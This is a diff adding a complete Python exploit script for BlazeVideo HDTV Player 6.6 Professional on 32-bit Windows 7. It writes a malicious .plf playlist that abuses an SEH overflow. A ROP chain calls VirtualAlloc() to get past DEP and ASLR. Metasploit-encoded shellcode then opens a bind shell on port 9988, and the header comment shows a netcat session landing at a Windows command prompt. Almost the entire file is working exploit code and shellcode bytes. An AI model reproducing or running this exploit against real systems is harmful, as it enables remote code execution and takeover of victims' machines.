@@ -1,0 +1,208 @@
+#!/usr/bin/python -w
+
+#-----------------------------------------------------------------------------------#
+# Exploit: BlazeVideo HDTV Player 6.6 Professional SEH&DEP&ASLR                     #
+# Author: b33f - http://www.fuzzysecurity.com/                                      #
+# OS: Tested on Windows 7 32-bit PRO SP1                                            #
+# Software Link: http://www.blazevideo.com/download.htm                             #
+#                Pro v6.6 - Apr 12, 2011                                            #
+#-----------------------------------------------------------------------------------#
+# The opportunity to secure ourselves against defeat lies in our own hands          #
+# but the opportunity of defeating the enemy is provided by the enemy himself.      #
+# - Sun Tzu                                                                         #
+#-----------------------------------------------------------------------------------#
+# Special thanks:                                                                   #
+# Lincoln - Thx for the assist!                                                     #
+# corelanc0d3r - Thx for taking the time to go over my work and pointing me         #
+#                at VirtualAlloc()!                                                 #                                  
+#-----------------------------------------------------------------------------------#
+# root@bt:~# nc -nv 192.168.111.129 9988                                            #
+# (UNKNOWN) [192.168.111.129] 9988 (?) open                                         #
+# Microsoft Windows [Version 6.1.7601]                                              #
+# Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                   #
+#                                                                                   #
+# C:\Program Files\BlazeVideo\BlazeVideo HDTV Player 6.6 Professional>              #
+#-----------------------------------------------------------------------------------#
+
+filename="blaze.plf"
+
+#-----------------------------Pivot-Align-----------------------------#
+SEH = "\x95\x53\x30\x61"  # Pivot; ADD ESP,800 # RETN
+pad = "b33f"*35           # pad ESP to our alignment (140-bytes)
+
+#------------------Save Stack Pointer in EDI&EAX&ESI------------------#
+stack = (
+"\xC5\x30\x03\x64"  # PUSH ESP # MOV EAX,EDI # POP EDI # POP ESI # RETN
+"\x41\x41\x41\x41"  # Padding for POP ESI
+"\x24\x60\x02\x64"  # PUSH ESP # POP ESI # RETN
+"\xEE\x65\x03\x64"  # XCHG EAX,ESI # RETN
+"\x24\x60\x02\x64"  # PUSH ESP # POP ESI # RETN
+"\xBF\xCD\x02\x64") # ADD ESP,20 # RETN
+
+#----------------------------VirtualAlloc()---------------------------#
+params = (
+"\xB4\x11\x34\x60"  # VirtualAlloc()
+"WWWW"              # lpAddress \ We need this value twice for alignment!
+"WWWW"              # lpAddress /
+"XXXX"              # dwSize (0x1)
+"YYYY"              # flAllocationType (0x1000)
+"ZZZZ"              # flProtect (0x40)
+"\x41\x41\x41\x41"  # Padding
+"\x41\x41\x41\x41") # Padding
+
+#-----------------------ROP Chain - lpAddress-------------------------#
+rop = (
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  \
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  | ADD EAX 1E0
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  |
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN  /
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN \
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN |
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN | DEC ESI 8
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN | We need lpAddress twice to return to the proper 
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN | place after executing VirtualAlloc(), the lpAddress
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN | parameters are located at ESI+10 and ESI+14
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN |
+"\xCB\x06\x11\x64"  # DEC ESI # AND BYTE PTR DS:[EDI-18],DL # RETN /
+"\xCA\xB5\x33\x60"  # MOV DWORD PTR DS:[ESI+10],EAX # MOV DWORD PTR DS:[ESI+14],EAX # MOV EAX,ESI # POP ESI # POP EBX # RETN
+"\x41\x41\x41\x41"  # Padding for POP ESI
+"\x41\x41\x41\x41"  # Padding for POP EBX
+
+#------------------------ROP Chain - dwSize---------------------------#
+"\xD3\xB1\x04\x64"  # PUSH EAX # POP ESI # RETN 04
+"\xCA\x71\x04\x64"  # XCHG EAX,EDI # ADD EAX,2EB0000 # XOR EAX,EAX # RETN 04
+"\x41\x41\x41\x41"  # Padding for RETN 04
+"\x6D\xA1\x03\x64"  # INC EAX # RETN
+"\x41\x41\x41\x41"  # Padding for RETN 04
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x90\x73\x64\x61"  # MOV DWORD PTR DS:[ESI+14],EAX # MOV EAX,ESI # POP ESI # POP EBX # RETN
+"\x41\x41\x41\x41"  # Padding for POP ESI
+"\x41\x41\x41\x41"  # Padding for POP EBX
+
+#-------------------ROP Chain - flAllocationType----------------------#
+"\xD3\xB1\x04\x64"  # PUSH EAX # POP ESI # RETN 04
+"\xCA\x71\x04\x64"  # XCHG EAX,EDI # ADD EAX,2EB0000 # XOR EAX,EAX # RETN 04
+"\x41\x41\x41\x41"  # Padding for RETN 04
+"\x13\x30\x10\x64"  # POP EAX # RETN
+"\x41\x41\x41\x41"  # Padding for RETN 04
+"\xFF\xEF\xFF\xFF"  # 0xFFFFEFFF
+"\xCB\x6E\x33\x61"  # NEG EAX # RETN
+"\x2C\x4E\x10\x64"  # DEC EAX # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x90\x73\x64\x61"  # MOV DWORD PTR DS:[ESI+14],EAX # MOV EAX,ESI # POP ESI # POP EBX # RETN
+"\x41\x41\x41\x41"  # Padding for POP ESI
+"\x41\x41\x41\x41"  # Padding for POP EBX
+
+#-----------------------ROP Chain - flProtect-------------------------#
+"\xD3\xB1\x04\x64"  # PUSH EAX # POP ESI # RETN 04
+"\xCA\x71\x04\x64"  # XCHG EAX,EDI # ADD EAX,2EB0000 # XOR EAX,EAX # RETN 04
+"\x41\x41\x41\x41"  # Padding for RETN 04
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN
+"\x41\x41\x41\x41"  # Padding for RETN 04
+"\xF7\x24\x03\x64"  # ADD EAX,20 # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x15\x14\x03\x64"  # INC ESI # RETN
+"\x90\x73\x64\x61"  # MOV DWORD PTR DS:[ESI+14],EAX # MOV EAX,ESI # POP ESI # POP EBX # RETN
+"\x41\x41\x41\x41"  # Padding for POP ESI
+"\x41\x41\x41\x41"  # Padding for POP EBX
+
+#-----------------ROP Chain - Fix PTR VirtualAlloc()------------------#
+"\xD3\xB1\x04\x64"  # PUSH EAX # POP ESI # RETN 04
+"\x0B\xA8\x03\x64"  # MOV EAX,DWORD PTR DS:[EAX] # RETN
+"\x41\x41\x41\x41"  # Padding for RETN 04
+"\x0B\xA8\x03\x64"  # MOV EAX,DWORD PTR DS:[EAX] # RETN
+"\x64\x40\x04\x64"  # MOV DWORD PTR DS:[ESI],EAX # POP ESI # RETN
+"\x41\x41\x41\x41"  # Padding for POP ESI
+"\x16\xA4\x04\x64"  # MOV EAX,EDI # POP EDI # POP ESI # RETN
+"\x41\x41\x41\x41"  # Padding for POP EDI
+"\x41\x41\x41\x41"  # Padding for POP ESI
+"\x6D\xA1\x03\x64"  # INC EAX # RETN
+"\x6D\xA1\x03\x64"  # INC EAX # RETN
+"\x6D\xA1\x03\x64"  # INC EAX # RETN
+"\x6D\xA1\x03\x64"  # INC EAX # RETN
+"\xC6\x2A\x03\x64") # PUSH EAX # POP ESP # RETN
+
+#-------------------------------------------------------------------------------------#
+# We have an ample amount of space...                                                 #
+# msfpayload windows/shell_bind_tcp LPORT=9988 R| msfencode -e x86/alpha_mixed -t c   #
+# [*] x86/alpha_mixed succeeded with size 743 (iteration=1)                           #
+#-------------------------------------------------------------------------------------#
+shellcode = (
+"\x89\xe5\xda\xd8\xd9\x75\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
+"\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
+"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
+"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39"
+"\x6c\x79\x78\x6b\x39\x63\x30\x57\x70\x55\x50\x31\x70\x6b\x39"
+"\x39\x75\x30\x31\x78\x52\x45\x34\x6e\x6b\x70\x52\x36\x50\x6e"
+"\x6b\x32\x72\x34\x4c\x4c\x4b\x50\x52\x77\x64\x4c\x4b\x50\x72"
+"\x74\x68\x54\x4f\x68\x37\x31\x5a\x51\x36\x65\x61\x6b\x4f\x74"
+"\x71\x59\x50\x6e\x4c\x75\x6c\x75\x31\x53\x4c\x63\x32\x54\x6c"
+"\x31\x30\x4f\x31\x38\x4f\x44\x4d\x56\x61\x78\x47\x6b\x52\x78"
+"\x70\x76\x32\x73\x67\x4e\x6b\x43\x62\x52\x30\x4e\x6b\x70\x42"
+"\x37\x4c\x43\x31\x4a\x70\x4e\x6b\x67\x30\x42\x58\x6d\x55\x6f"
+"\x30\x31\x64\x62\x6a\x37\x71\x7a\x70\x62\x70\x4e\x6b\x42\x68"
+"\x72\x38\x6e\x6b\x32\x78\x75\x70\x67\x71\x4b\x63\x6d\x33\x45"
+"\x6c\x73\x79\x4c\x4b\x57\x44\x6e\x6b\x43\x31\x5a\x76\x66\x51"
+"\x4b\x4f\x65\x61\x79\x50\x6e\x4c\x6f\x31\x38\x4f\x44\x4d\x36"
+"\x61\x48\x47\x47\x48\x6d\x30\x53\x45\x6c\x34\x56\x63\x51\x6d"
+"\x58\x78\x55\x6b\x63\x4d\x55\x74\x61\x65\x6a\x42\x36\x38\x4c"
+"\x4b\x36\x38\x77\x54\x36\x61\x38\x53\x31\x76\x4e\x6b\x34\x4c"
+"\x72\x6b\x4c\x4b\x53\x68\x67\x6c\x77\x71\x39\x43\x4e\x6b\x66"
+"\x64\x4c\x4b\x43\x31\x48\x50\x4c\x49\x53\x74\x35\x74\x35\x74"
+"\x43\x6b\x33\x6b\x30\x61\x73\x69\x71\x4a\x62\x71\x49\x6f\x6d"
+"\x30\x50\x58\x31\x4f\x61\x4a\x4e\x6b\x42\x32\x38\x6b\x6d\x56"
+"\x43\x6d\x33\x58\x75\x63\x74\x72\x57\x70\x35\x50\x50\x68\x42"
+"\x57\x51\x63\x70\x32\x43\x6f\x73\x64\x33\x58\x32\x6c\x51\x67"
+"\x56\x46\x76\x67\x6b\x4f\x4b\x65\x6f\x48\x6c\x50\x63\x31\x63"
+"\x30\x73\x30\x37\x59\x78\x44\x72\x74\x32\x70\x55\x38\x64\x69"
+"\x6d\x50\x50\x6b\x43\x30\x69\x6f\x4e\x35\x72\x70\x72\x70\x56"
+"\x30\x42\x70\x63\x70\x50\x50\x61\x50\x62\x70\x30\x68\x79\x7a"
+"\x76\x6f\x4b\x6f\x6d\x30\x59\x6f\x79\x45\x4e\x69\x79\x57\x44"
+"\x71\x39\x4b\x56\x33\x65\x38\x76\x62\x35\x50\x57\x57\x76\x64"
+"\x6d\x59\x6b\x56\x51\x7a\x62\x30\x33\x66\x56\x37\x65\x38\x59"
+"\x52\x49\x4b\x77\x47\x55\x37\x59\x6f\x59\x45\x46\x33\x51\x47"
+"\x45\x38\x6c\x77\x39\x79\x65\x68\x39\x6f\x59\x6f\x6b\x65\x46"
+"\x33\x56\x33\x73\x67\x72\x48\x74\x34\x7a\x4c\x37\x4b\x59\x71"
+"\x6b\x4f\x68\x55\x61\x47\x6f\x79\x78\x47\x43\x58\x50\x75\x62"
+"\x4e\x70\x4d\x53\x51\x49\x6f\x7a\x75\x35\x38\x32\x43\x30\x6d"
+"\x42\x44\x75\x50\x6c\x49\x48\x63\x72\x77\x46\x37\x33\x67\x56"
+"\x51\x69\x66\x42\x4a\x57\x62\x50\x59\x70\x56\x59\x72\x69\x6d"
+"\x43\x56\x4b\x77\x77\x34\x75\x74\x77\x4c\x77\x71\x56\x61\x4c"
+"\x4d\x37\x34\x31\x34\x44\x50\x58\x46\x37\x70\x51\x54\x31\x44"
+"\x52\x70\x42\x76\x46\x36\x51\x46\x67\x36\x43\x66\x50\x4e\x43"
+"\x66\x42\x76\x43\x63\x71\x46\x45\x38\x53\x49\x48\x4c\x37\x4f"
+"\x4b\x36\x59\x6f\x58\x55\x4b\x39\x6b\x50\x62\x6e\x56\x36\x61"
+"\x56\x4b\x4f\x30\x30\x31\x78\x77\x78\x4e\x67\x47\x6d\x33\x50"
+"\x49\x6f\x6b\x65\x4d\x6b\x48\x70\x6d\x65\x4e\x42\x32\x76\x65"
+"\x38\x59\x36\x4f\x65\x6f\x4d\x4d\x4d\x49\x6f\x78\x55\x47\x4c"
+"\x33\x36\x71\x6c\x57\x7a\x4b\x30\x39\x6b\x6b\x50\x53\x45\x64"
+"\x45\x4f\x4b\x53\x77\x75\x43\x44\x32\x50\x6f\x32\x4a\x43\x30"
+"\x50\x53\x49\x6f\x48\x55\x41\x41")
+
+ph33r = "\x90"*160 + shellcode
+b00m = SEH + pad + stack + params + rop + ph33r
+
+buffer = "A"*872 + b00m + "B"*(4128-len(b00m))
+
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
